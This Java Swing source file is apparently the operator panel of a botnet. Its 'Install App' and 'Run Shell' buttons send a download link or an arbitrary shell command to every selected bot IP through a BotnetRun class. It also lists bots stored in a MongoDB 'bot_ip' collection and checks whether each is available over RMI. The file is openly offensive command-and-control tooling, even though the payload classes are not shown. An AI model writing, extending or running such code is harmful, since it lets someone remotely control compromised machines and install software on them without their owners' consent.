/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package view;

import DBUtils.MongoConnect;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.rmi.Naming;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import model.IBotnet;
import server.BotnetRun;
import server.TCPServer;
import view.RunningStates;

/**
 *
 * @author dharm
 */
public class ActionFrm extends javax.swing.JFrame {

    /**
     * Creates new form ActionFrm
     */
    private ArrayList <String> selectedIP; 
    public ActionFrm() {
        initComponents();
    }
    
    public ActionFrm(ArrayList <String> selectedIP){
        initComponents();
        this.selectedIP = selectedIP;
        String label = "Selected IP: ";
        for (int i = 0; i < selectedIP.size(); i++) {
            label += selectedIP.get(i) + " \n ";
        }
        selectedIPLabel.setText(label);
    }
    public static boolean isValidURL(String url) 
    { 
        /* Try creating a valid URL */
        try { 
            new URL(url).toURI(); 
            return true; 
        } 
          
        // If there was an Exception 
        // while creating URL object 
        catch (Exception e) { 
            return false; 
        } 
    } 

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        selectedIPLabel = new javax.swing.JLabel();
        installApplButton = new javax.swing.JButton();
        runShellButton = new javax.swing.JButton();
        backButton = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        selectedIPLabel.setText("Selected IP:");

        installApplButton.setText("Install App");
        installApplButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                installApplButtonActionPerformed(evt);
            }
        });

        runShellButton.setText("Run Shell");
        runShellButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                runShellButtonActionPerformed(evt);
            }
        });

        backButton.setText("Back");
        backButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                backButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(74, 74, 74)
                .addComponent(installApplButton, javax.swing.GroupLayout.PREFERRED_SIZE, 129, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 162, Short.MAX_VALUE)
                .addComponent(runShellButton, javax.swing.GroupLayout.PREFERRED_SIZE, 127, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(69, 69, 69))
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(selectedIPLabel))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(31, 31, 31)
                        .addComponent(backButton)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(selectedIPLabel)
                .addGap(118, 118, 118)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(installApplButton, javax.swing.GroupLayout.PREFERRED_SIZE, 52, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(runShellButton, javax.swing.GroupLayout.PREFERRED_SIZE, 52, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 139, Short.MAX_VALUE)
                .addComponent(backButton)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void installApplButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_installApplButtonActionPerformed
        // TODO add your handling code here:
        String linkApp = JOptionPane.showInputDialog("Your direct link app");
        if (linkApp != null){
            if(linkApp.isEmpty())
            {
                JOptionPane.showMessageDialog(rootPane, "Insert direct link", "Errors", JOptionPane.ERROR_MESSAGE);
            } else if (!isValidURL(linkApp))
            {
                JOptionPane.showMessageDialog(rootPane, "Wrong link", "Errors", JOptionPane.ERROR_MESSAGE);
            } else
            {
                System.out.println(linkApp);
                Boolean result = true;
                for (String ip : this.selectedIP){
                    try {
                        BotnetRun botrun = new BotnetRun(ip, "install", linkApp);
                        Thread thread = new Thread(botrun);
                        thread.start();
                        thread.join();
                        ArrayList <String> value = botrun.get_values();
                         if (value == null) System.out.println("Fail");
                        else
                        value.forEach(i -> System.out.println(i));
                    } catch (InterruptedException ex) {
                        result = false;
                    }
                    
                }
                if(result)
                {
                    JOptionPane.showMessageDialog(rootPane, "Success");
                }
                else JOptionPane.showMessageDialog(rootPane, "Failed");
            }
        }
        
    }//GEN-LAST:event_installApplButtonActionPerformed

    private void runShellButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_runShellButtonActionPerformed
        // TODO add your handling code here:
        String command = JOptionPane.showInputDialog("Your command");
        if (command != null){
            if(command.isEmpty())
            {
                JOptionPane.showMessageDialog(rootPane, "Insert command", "Errors", JOptionPane.ERROR_MESSAGE);
            } else
            {
                Boolean result = true;
                ArrayList<String> states = new ArrayList<>();
                ArrayList < ArrayList<String > > output = new ArrayList<>();
                for (String ip : this.selectedIP){
                    try {
                        BotnetRun botrun = new BotnetRun(ip, "run", command);
                        Thread thread = new Thread(botrun);
                        thread.start();
                        thread.join();
                        ArrayList <String> value = botrun.get_values();
                        output.add(value);
                        if (value == null){
                            System.out.println("fail");
                            states.add("Fail");
                        }
                        else{
                            states.add("Success");
                        }
                    } catch (InterruptedException ex) {
                        result = false;
                    }
                }
                new RunningStates(this.selectedIP, states, output).setVisible(true);
//                if(result)
//                {
//                    JOptionPane.showMessageDialog(rootPane, "Success");
//                }
//                else JOptionPane.showMessageDialog(rootPane, "Failed");
            }
        }
        
    }//GEN-LAST:event_runShellButtonActionPerformed

    private void backButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_backButtonActionPerformed
        // TODO add your handling code here:
        MongoConnect client = new MongoConnect();
        client.Connect();
        ArrayList<String> list = client.Read("bot_ip");
        ArrayList<String> states = new ArrayList<>();
        for (String ip : list){
            try {
                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
                states.add("Available");
            } catch (Exception ex){
                states.add("Unavailable");
            }
        }
        new ListFrm(list, states).setVisible(true);
        this.setVisible(false);
    }//GEN-LAST:event_backButtonActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(ActionFrm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(ActionFrm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(ActionFrm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(ActionFrm.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new ActionFrm().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton backButton;
    private javax.swing.JButton installApplButton;
    private javax.swing.JButton runShellButton;
    private javax.swing.JLabel selectedIPLabel;
    // End of variables declaration//GEN-END:variables
}
